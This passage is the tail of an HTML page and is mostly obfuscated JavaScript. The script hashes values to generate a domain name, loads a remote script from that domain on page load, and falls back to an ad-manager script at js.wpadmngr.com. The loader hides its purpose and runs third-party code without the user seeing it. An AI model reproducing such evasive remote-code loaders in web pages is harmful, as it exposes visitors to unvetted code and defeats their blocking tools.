3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>